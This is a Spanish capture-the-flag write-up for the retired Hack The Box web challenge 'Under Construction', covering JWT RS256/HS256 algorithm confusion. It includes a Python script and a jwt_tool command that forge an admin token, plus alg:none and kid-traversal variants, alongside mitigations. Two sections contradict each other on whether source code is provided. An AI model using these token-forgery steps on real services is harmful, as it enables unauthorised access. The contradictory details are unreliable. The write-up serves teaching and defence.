---
challenge: Under Construction
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, jwt, alg-confusion, rs256, hs256]
---


# Under Construction — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

App Node/Express con autenticación por **JWT RS256**. La clave pública se sirve en `/public.pem` (y con `kid` apuntando a `/jwks.json`) y la librería acepta los algoritmos que declare el token. Cambiando `alg` a `HS256` y firmando con la clave pública como secreto HMAC, el servidor valida el token con su propia clave pública: se firma un JWT de `admin` y se entra al panel.

## Enunciado y superficie

Registro y login. Tras autenticarse, redirige a `/home`, que muestra `Welcome <usuario>`. Existe `/admin` y el código fuente está en el reto.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```js
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public.pem');

app.get('/public.pem', (req, res) => res.send(publicKey));

app.post('/login', (req, res) => {
  const token = jwt.sign({ username: user.username }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth', token);
});

function auth(req, res, next) {
  const decoded = jwt.verify(req.cookies.auth, publicKey);   // sin algorithms fijo
  ...
}
```

El fallo clásico: `jwt.verify` sin la opción `algorithms`. Si el token pide `HS256`, la librería usa `publicKey` como *secreto HMAC*. La clave pública no es secreta, así que cualquiera puede firmar.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

```bash
curl -s http://<IP>:<PORT>/public.pem -o public.pem
```

```python
import jwt, requests

clave = open("public.pem", "rb").read()
token = jwt.encode({"username": "admin"}, clave, algorithm="HS256")
r = requests.get("http://<IP>:<PORT>/admin", cookies={"auth": token})
print(r.text)
```

```text
HTB{<flag>}
```

Con `jwt_tool` el flujo es el mismo:

```bash
python3 jwt_tool.py <token> -X k -pk public.pem
# -X k = key confusion; prueba también alg=none y kid traversals
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Verificar un JWT sin fijar `algorithms` deja la puerta abierta a confusión de algoritmos.
- La clave pública **nunca** puede actuar como secreto: es pública por definición.
- Mitigación: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`, validar `iss`/`aud`, y no aceptar `kid`/`jwk` del cliente.

## Mitigaciones y detección

- Fijar el algoritmo esperado y validar firma, `iss`, `aud` y caducidad en cada petición.

## Referencias

- [node-jwt-prototype](../../knowledge/web/node-jwt-prototype.md)
- [rop-stack](../../knowledge/pwn/rop-stack.md)

## Variantes del mismo fallo

- **`alg: none`** si la librería antigua acepta tokens sin firma y no se filtra el algoritmo.
- **`kid` con traversal**: `kid: ../../../../dev/null` firma con contenido vacío conocido.
- **JWK embebido**: el servidor confía en la clave del header `jwk` y se firma con la propia.
